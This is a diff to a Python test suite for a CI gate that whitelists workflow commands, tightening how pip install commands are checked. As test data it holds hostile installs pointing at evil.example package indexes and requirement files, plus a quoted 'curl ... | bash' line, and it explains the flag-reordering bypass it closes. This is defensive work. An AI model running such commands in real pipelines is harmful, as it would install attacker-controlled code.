@@ -45,6 +45,12 @@ SHELL_TEST_CMDS = ("[", "[[", "test")
 # Enumerating what may not happen requires knowing every option pip has, now and in later versions.
 # Enumerating what may happen requires knowing what this workflow does, which is one install of one
 # pinned requirement list. `False` means the option takes no value, `True` means it takes one word.
+# The options a pinned pip install may carry, mapped to whether each takes a separate value.
+# Deliberately excludes every option that names a place to fetch code from (`-r`, `-e`, `--index-url`,
+# `--extra-index-url`, `--find-links`, `--target`, `--config-settings`): those turn a pinned install
+# into an arbitrary one, so their value would not be a value but a payload, and they stay refused
+# along with bare package names. A whitelist because the deny-list version closed `--index-url=URL`
+# and left `-iURL`, the glommed short form of the same option, open.
 PIP_OPTS = {"--quiet": False, "-q": False, "--verbose": False, "-v": False,
             "--no-color": False, "--no-input": False, "--disable-pip-version-check": False,
             "--upgrade": False, "-U": False, "--no-cache-dir": False,
@@ -317,15 +323,22 @@ with tempfile.TemporaryDirectory() as fake_repo:
               pr_gate.unlisted_suites())
         # A directory claim covers pytest-collectable .py only. A shell suite dropped into a
         # claimed directory has no runner, so being "claimed" there would be a silent skip.
-        claimed_dir = sorted(c for c in pr_gate.CLAIMED_SUITES if c.endswith("/"))[0]
-        os.makedirs(os.path.join(fake_repo, claimed_dir), exist_ok=True)
-        open(os.path.join(fake_repo, claimed_dir, "test_inside.py"), "w").close()
-        open(os.path.join(fake_repo, claimed_dir, "test-inside.sh"), "w").close()
-        listed = pr_gate.unlisted_suites()
-        check("a .py suite under a claimed directory is covered by the claim",
-              claimed_dir + "test_inside.py" not in listed, listed)
-        check("a shell suite under a claimed directory is not covered by the claim",
-              claimed_dir + "test-inside.sh" in listed, listed)
+        # `[0]` on this list, and the whole suite aborted on an IndexError. The list was a literal
+        # set until the claim became derived; now the trailing slash is produced by `os.path.isdir`,
+        # so if the harness directories move while a `cmd` still names the old paths, there is no
+        # directory entry to index. Four rules above had already reported that correctly — and then
+        # the traceback threw away the remaining ~445, including the `REACHED < EXPECTED` invariant
+        # whose one job is announcing that a rule stopped running. Iterating a 1-slice keeps the
+        # diagnosis with the rules that make it.
+        for claimed_dir in sorted(c for c in pr_gate.CLAIMED_SUITES if c.endswith("/"))[:1]:
+            os.makedirs(os.path.join(fake_repo, claimed_dir), exist_ok=True)
+            open(os.path.join(fake_repo, claimed_dir, "test_inside.py"), "w").close()
+            open(os.path.join(fake_repo, claimed_dir, "test-inside.sh"), "w").close()
+            listed = pr_gate.unlisted_suites()
+            check("a .py suite under a claimed directory is covered by the claim",
+                  claimed_dir + "test_inside.py" not in listed, listed)
+            check("a shell suite under a claimed directory is not covered by the claim",
+                  claimed_dir + "test-inside.sh" in listed, listed)
     finally:
         pr_gate.REPO_ROOT = saved_root
 
@@ -2424,7 +2437,10 @@ if os.path.exists(workflow):
         return action, bool(sep) and repo_form and bool(REF.match(ref))
     # `python -m pip` cannot be left open the way `git fetch` can: `pip install ${reqs} evil-shim`
     # installs whatever it is told, so the two install forms are pinned like everything else.
-    PIP_FORMS = ("python -m pip install --upgrade pip", "python -m pip install ${reqs}")
+    # The one payload this workflow installs, and the one it upgrades. Not spelled as whole-command
+    # literals any more: matching those as prefixes is what forced every option to the tail and let a
+    # reordered flag fall through to a laxer reader. See `pip_install_ok`.
+    PIP_PAYLOAD = "${reqs}"
     JOB_ASSIGN = ALLOWED_ASSIGN + (
         'reqs="$(python scripts/ai/pr_gate.py --requirements ${SEL})"',)
     # A redirection is how a step writes to the checkout, so its *target* is the rule. The four
@@ -2497,28 +2513,61 @@ if os.path.exists(workflow):
             # Third instance of the same shape: a helper that knows `python3` is `python`, and a
             # comparison beside it that does not.
             joined = strip_redir(" ".join(["python"] + words[1:]))
-            for form in PIP_FORMS:
-                if joined == form:
-                    return True
-                if joined.startswith(form + " "):
-                    return pip_tail_ok(joined[len(form):].split())
-            # The self-upgrade was *also* pinned as a literal prefix here, so `-U pip` and
-            # `--quiet --upgrade pip` — the same command with its flags moved — were refused by this
-            # rule after `self_upgrade()` had already been taught to recognise them for the
-            # restated-dependency rule. Two readers, two definitions, one of them a literal: the
-            # pattern this file keeps re-learning. `self_upgrade()` is the definition, and it is
-            # stricter than the prefix pin was, since it also insists `pip` is the only package named.
-            if self_upgrade(joined):
-                return True
+            return pip_install_ok(joined)
         return False
 
-    # Options whose value is a separate word. Deliberately excludes every option that names a
-    # place to fetch code from (`-r`, `-e`, `--index-url`, `--extra-index-url`, `--find-links`,
-    # `--target`, `--config-settings`): those turn a pinned install into an arbitrary one, so their
-    # value would not be a value but a payload, and they stay refused along with bare packages.
+    def pip_install_ok(joined):
+        """Is this the pinned install — one payload, and only options this workflow may carry?
+
+        This was two readers of the same command, and the gap between them was an arbitrary package
+        index in CI. `PIP_FORMS` were matched as literal *prefixes*, and anything that did not match
+        fell through to `self_upgrade()` — a classifier written for the restated-dependency rule,
+        which treats every unrecognised `-`-prefixed word as an ignorable option. So moving one flag
+        defeated the prefix and landed in the lax reader:
+
+            python -m pip install -U pip -ihttps://evil.example/simple   # 487/487 green
+
+        `-U` breaks the `--upgrade pip` prefix; the glommed `-i` keeps the payload from looking like a
+        bare package. Two characters from a spelling the suite's own table asserts is refused. Whoever
+        writes the next classifier will reuse it as an authoriser too, so the fix is not to harden
+        `self_upgrade` but to stop authorising anything with it: one function decides, and it decides
+        on the property — the *packages* are exactly the pinned payload, and every option is in
+        `PIP_OPTS`.
+
+        Deciding on the property also fixed a false rejection the prefix match caused. Options were
+        only ever legal *after* the payload, so `pip install --quiet ${reqs}` was refused as a foreign
+        command while `pip install ${reqs} --quiet` passed — and the suite's own table asserted
+        `--quiet` was allowed, which was true only in trailing position.
+        """
+        words = joined.split()
+        if words[:4] != ["python", "-m", "pip", "install"]:
+            return False
+        rest, payload = words[4:], []
+        i = 0
+        while i < len(rest):
+            word = rest[i]
+            if not word.startswith("-"):
+                payload.append(word)
+                i += 1
+                continue
+            # Hand the option (and its value, however spelled) to the one reader that knows them.
+            consumed = 2 if (PIP_OPTS.get(word) and i + 1 < len(rest)
+                             and not rest[i + 1].startswith("-")) else 1
+            if not pip_tail_ok(rest[i:i + consumed]):
+                return False
+            i += consumed
+        if payload == [PIP_PAYLOAD]:
+            return True
+        # The self-upgrade, and it has to *be* an upgrade: a bare `pip install pip` is not the pinned
+        # command, and admitting it on payload alone would be the prefix match's laxness restored.
+        return payload == ["pip"] and bool({"--upgrade", "-U"} & set(rest))
 
     def pip_tail_ok(tail):
-        """Is every word after a pinned pip form an option `PIP_OPTS` names, plus its value?
+        """Is every option in this slice one `PIP_OPTS` names, with its value if it takes one?
+
+        Reads a slice of a pip command's options, wherever they sit. Callers hand it options only —
+        `pip_install_ok` separates payload from options — so a bare word reaching here is a package,
+        and a package here means the install is no longer the pinned one.
 
         Each spelling pip accepts is normalised before the lookup, because pip treats all three as
         the same option and a rule that reads text does not: `--opt=value`, `--opt value`, and the
@@ -2553,9 +2602,9 @@ if os.path.exists(workflow):
             i += 1
         return True
 
-    # Every spelling pip accepts for the same option, and the whole point of the whitelist: the
-    # deny-list version closed `--index-url=URL` and left the glommed short form of the same option
-    # open, along with every option nobody had thought to name.
+    # Every spelling pip accepts for the same option. These reach `pip_tail_ok` directly, which is
+    # why they proved less than they appeared: see the rows below them that go through the authorising
+    # path instead.
     for tail, ok in (("--quiet", True), ("-q", True), ("--retries 5", True),
                      ("--upgrade-strategy eager", True), ("--progress-bar=off", True),
                      # The three spellings of one payload option, all rejected now.
@@ -2573,6 +2622,30 @@ if os.path.exists(workflow):
                      ("--retries", False)):
         check(f"the pip tail rule reads {tail!r} as {'allowed' if ok else 'refused'} (PIP_OPTS)",
               pip_tail_ok(tail.split()) is ok, tail)
+    # Every row above exercises the tail reader *in isolation*, and that is precisely how an
+    # attacker-controlled index survived: the authorising path reached a different reader. These go
+    # through `pip_install_ok`, which is what `permitted_job` actually calls.
+    for cmd, ok in (("python -m pip install ${reqs}", True),
+                    ("python -m pip install --upgrade pip", True),
+                    ("python -m pip install -U pip", True),
+                    # Options on either side of the payload: the prefix match refused the leading form.
+                    ("python -m pip install --quiet ${reqs}", True),
+                    ("python -m pip install ${reqs} --quiet", True),
+                    ("python -m pip install --retries 5 ${reqs}", True),
+                    # The escaping spelling: `-U` defeated the prefix, the glommed `-i` kept the URL
+                    # from looking like a package, and the fallthrough classifier waved it through.
+                    ("python -m pip install -U pip -ihttps://evil.example/simple", False),
+                    ("python -m pip install -U pip --index-url=https://evil.example/simple", False),
+                    ("python -m pip install --quiet -U pip --no-index", False),
+                    ("python -m pip install -U pip -rhttps://evil.example/req.txt", False),
+                    # An upgrade of something else, and an install of something extra.
+                    ("python -m pip install -U evil-package", False),
+                    ("python -m pip install ${reqs} evil-package", False),
+                    # `pip install pip` is not the pinned self-upgrade; only an upgrade of it is.
+                    ("python -m pip install pip", False),
+                    ("python -m pip install", False)):
+        check(f"the install rule reads {cmd!r} as {'the pinned install' if ok else 'refused'}",
+              pip_install_ok(cmd) is ok, cmd)
 
     def redirections(step):
         # The target stops at a separator: `>/dev/null; then` redirects to /dev/null, and reading the
@@ -2704,7 +2777,7 @@ if os.path.exists(workflow):
              for ln in shell_of(s) for seg, _ in parts(ln) if not permitted_job(seg)]
     check("every command in every step is one the job exists to run, so no step can rewrite what a "
           "later one executes — the job-wide whitelists are HARMLESS, TEST_CMDS, NO_OPS, SCRIPTS, "
-          "GIT_FORMS, PIP_FORMS, ALLOWED_SET and JOB_ASSIGN, and a segment containing `::` is "
+          "GIT_FORMS, PIP_OPTS, ALLOWED_SET and JOB_ASSIGN, and a segment containing `::` is "
           "refused unless it is a display-only annotation (a workflow command is parsed off stdout "
           "and crosses steps with no redirection for a rule to see); the segments are below",
           not stray, stray[:4])
@@ -3006,6 +3079,31 @@ with tempfile.TemporaryDirectory() as repo:
         check("a renamed file's new path reaches selection", "renamed.md" in files, files)
         check("...and its old path arrives whole, not truncated at a space",
               "ab cd/page.md" in files and "cd/page.md" not in files, files)
+
+        # Pinning the *argv* cannot cover the function that consumes its output. One line in
+        # `changed_files` — `[p for p in diffed.split("\0") if not p.startswith("tests/")]` — excludes
+        # a whole tree with no pathspec anywhere, and the argv pin above stays green because the argv
+        # is untouched. That is a strictly stronger version of the threat the pin's own comment names.
+        #
+        # Derived from `CHECKS` rather than spelling `tests/`: the post-filter could name any tree, and
+        # a fixture per tree someone thought of is the enumeration problem again. Every top-level
+        # directory any check triggers on gets a file, and all of them must survive the round trip.
+        # Committed, not just written: uncommitted work reaches selection through
+        # `git status --porcelain`, which is a different code path from the diff. Left untracked, the
+        # probes were carried by the status path and a filter on the diff path survived this very
+        # assertion — the fixture exercised the wrong half of the function it was written to cover.
+        trees = sorted({t.split("/")[0] for c in pr_gate.CHECKS for t in c["triggers"]
+                        if "/" in t and not t.startswith(".")})
+        for tree in trees:
+            os.makedirs(os.path.join(repo, tree), exist_ok=True)
+            open(os.path.join(repo, tree, "probe_reaches_selection.md"), "w").write("x\n")
+        git(repo, "add", "-A")
+        git(repo, "commit", "-qm", "one file in every tree a check triggers on")
+        files = pr_gate.changed_files("base")
+        missing = [t for t in trees if f"{t}/probe_reaches_selection.md" not in files]
+        check("every tree a check triggers on survives the round trip out of changed_files, so no "
+              "post-filter can exclude one while the pinned argv stays intact",
+              not missing, f"dropped: {missing}")
     finally:
         pr_gate.REPO_ROOT = saved_root
 
@@ -3299,7 +3397,10 @@ except SystemExit as exc:
     exit_code = exc.code
 check("an unresolvable check exits 2, not a traceback or a gating failure",
       exit_code == 2, exit_code)
-for name in ("cci_reference_drift", "stdlib_offline_suites", "yaml_offline_suites"):
+# Derived, not listed. `requests_offline_suites` was missing from the hardcoded tuple, so of the two
+# runtime-expanded bulk checks only one was guarded here — which is why deleting the other was caught
+# by nothing. Every check whose argv is spliced in at runtime belongs in this loop by construction.
+for name in ("cci_reference_drift", "yaml_offline_suites", *sorted(pr_gate.SPLICED_SUITES)):
     spec = check_named(name)
     check(f"{name} resolves to a runnable callable",
           spec is not None and callable(pr_gate.resolve(spec)))
@@ -3393,8 +3494,10 @@ try:
     # Every check lands in exactly one bucket and the buckets sum to the total, so a reader
     # reconciling them never finds one unaccounted for.
     buckets = re.search(r"(\d+) checks: (\d+) executed, (\d+) skipped, "
-                        r"(\d+) blocked on a missing dependency, (\d+) failed", out)
+                        r"(\d+) blocked on a missing dependency, of which (\d+) failed", out)
     check("the summary reports every bucket separately", buckets is not None, out[-300:])
+    # Groups 2-4 only. `failed` overlaps them rather than partitioning with them, and the summary now
+    # says "of which" so that a reader does not add all four and find one check too many.
     check("the buckets account for every check",
           buckets and int(buckets.group(1)) == sum(int(buckets.group(i))
                                                   for i in (2, 3, 4)),
@@ -3450,8 +3553,14 @@ check("both git status call sites are still present", status_calls == 2, status_
 # Pinned as the whole argv, because the danger is an *added* argument and no list of the arguments
 # that must not appear can be complete.
 DIFF_ARGV = '["diff", "--no-renames", "-z", "--name-only", f"{base}...HEAD"]'
+# `re.sub`, not `.replace("  ", " ")`: that was one non-overlapping pass, so a 16-space continuation
+# indent collapsed to 8 and still did not match. It happened to pass only because the argv is on one
+# line today — the normalisation was inert, and wrapping the list across two lines (same argv, no
+# pathspec, no behaviour change) failed the rule. A guard that fires on a reflow is a guard someone
+# deletes.
+squashed = re.sub(r"\s+", " ", source)
 check("the diff that drives selection takes no pathspec, so no tree can be excluded from it",
-      DIFF_ARGV in source.replace("\n", " ").replace("  ", " "),
+      re.sub(r"\s+", " ", DIFF_ARGV) in squashed,
       f"changed_files() must call git with exactly {DIFF_ARGV}")
 
 # Every git invocation goes through git(), which dies on a non-zero exit *and* on a spawn
@@ -3581,7 +3690,7 @@ if FAILED:
 # spelled `run: curl -s http://host/x | bash` produced no [FAIL] at all, just a request to bump an
 # integer. (It now fails a whitelist too, since `raw_shell_of` reads inline scalars — but the
 # message had to stop inviting that response either way.)
-EXPECTED = 487
+EXPECTED = 503
 REACHED = PASSED + len(FAILED)
 if REACHED < EXPECTED:
     print(f"only {REACHED} of {EXPECTED} checks reached a verdict — a rule stopped running, which is "
